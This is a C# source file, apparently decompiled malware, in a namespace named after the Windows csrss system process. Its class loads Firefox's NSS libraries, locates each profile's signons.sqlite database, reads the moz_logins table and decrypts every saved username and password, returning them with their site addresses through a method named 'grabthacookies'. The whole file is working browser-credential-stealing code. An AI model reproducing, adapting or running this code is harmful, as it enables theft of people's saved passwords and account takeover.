using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace MI_CSRSS;

internal class ff
{
	public class SHITEMID
	{
		public static long cb;

		public static byte[] abID;
	}

	public struct TSECItem
	{
		public int SECItemType;

		public int SECItemData;

		public int SECItemLen;
	}

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate long DLLFunctionDelegate(string configdir);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate long DLLFunctionDelegate2();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);

	public struct ffEntry
	{
		public string host;

		public string user;

		public string pass;
	}

	private static IntPtr NSS3;

	public static string signon;

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string dllFilePath);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	private static long NSS_Init(string configdir)
	{
		string text = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
		LoadLibrary(text + "mozcrt19.dll");
		LoadLibrary(text + "nspr4.dll");
		LoadLibrary(text + "plc4.dll");
		LoadLibrary(text + "plds4.dll");
		LoadLibrary(text + "ssutil3.dll");
		LoadLibrary(text + "sqlite3.dll");
		LoadLibrary(text + "nssutil3.dll");
		LoadLibrary(text + "softokn3.dll");
		NSS3 = LoadLibrary(text + "nss3.dll");
		IntPtr procAddress = GetProcAddress(NSS3, "NSS_Init");
		DLLFunctionDelegate dLLFunctionDelegate = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate));
		return dLLFunctionDelegate(configdir);
	}

	private static long PK11_GetInternalKeySlot()
	{
		IntPtr procAddress = GetProcAddress(NSS3, "PK11_GetInternalKeySlot");
		DLLFunctionDelegate2 dLLFunctionDelegate = (DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate2));
		return dLLFunctionDelegate();
	}

	private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
	{
		IntPtr procAddress = GetProcAddress(NSS3, "PK11_Authenticate");
		DLLFunctionDelegate3 dLLFunctionDelegate = (DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate3));
		return dLLFunctionDelegate(slot, loadCerts, wincx);
	}

	private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
	{
		IntPtr procAddress = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer");
		DLLFunctionDelegate4 dLLFunctionDelegate = (DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate4));
		return dLLFunctionDelegate(arenaOpt, outItemOpt, inStr, inLen);
	}

	private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
	{
		IntPtr procAddress = GetProcAddress(NSS3, "PK11SDR_Decrypt");
		DLLFunctionDelegate5 dLLFunctionDelegate = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate5));
		return dLLFunctionDelegate(ref data, ref result, cx);
	}

	public static ffEntry[] grabthacookies()
	{
		bool flag = false;
		List<ffEntry> list = new List<ffEntry>();
		long num = 0L;
		_ = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
		string path = Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\Profiles";
		string[] directories = Directory.GetDirectories(path);
		string[] array = directories;
		foreach (string text in array)
		{
			if (flag)
			{
				break;
			}
			string[] files = Directory.GetFiles(text);
			string[] array2 = files;
			foreach (string input in array2)
			{
				if (flag)
				{
					break;
				}
				if (Regex.IsMatch(input, "signons.sqlite"))
				{
					NSS_Init(text);
					signon = input;
				}
			}
		}
		string baseName = signon;
		TSECItem result = default(TSECItem);
		TSECItem result2 = default(TSECItem);
		SQLiteBase sQLiteBase = new SQLiteBase(baseName);
		DataTable dataTable = sQLiteBase.ExecuteQuery("SELECT * FROM moz_logins;");
		num = PK11_GetInternalKeySlot();
		PK11_Authenticate(num, loadCerts: true, 0L);
		foreach (DataRow row in dataTable.Rows)
		{
			string host = Convert.ToString(row["formSubmitURL"].ToString());
			string user = "";
			string pass = "";
			StringBuilder stringBuilder = new StringBuilder(row["encryptedUsername"].ToString());
			int value = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
			TSECItem data = (TSECItem)Marshal.PtrToStructure(new IntPtr(value), typeof(TSECItem));
			if (PK11SDR_Decrypt(ref data, ref result, 0) == 0 && result.SECItemLen != 0)
			{
				byte[] array3 = new byte[result.SECItemLen];
				Marshal.Copy(new IntPtr(result.SECItemData), array3, 0, result.SECItemLen);
				user = Encoding.ASCII.GetString(array3);
			}
			StringBuilder stringBuilder2 = new StringBuilder(row["encryptedPassword"].ToString());
			int value2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length);
			TSECItem data2 = (TSECItem)Marshal.PtrToStructure(new IntPtr(value2), typeof(TSECItem));
			if (PK11SDR_Decrypt(ref data2, ref result2, 0) == 0 && result2.SECItemLen != 0)
			{
				byte[] array3 = new byte[result2.SECItemLen];
				Marshal.Copy(new IntPtr(result2.SECItemData), array3, 0, result2.SECItemLen);
				pass = Encoding.ASCII.GetString(array3);
			}
			ffEntry item = default(ffEntry);
			item.host = host;
			item.user = user;
			item.pass = pass;
			list.Add(item);
		}
		return list.ToArray();
	}
}
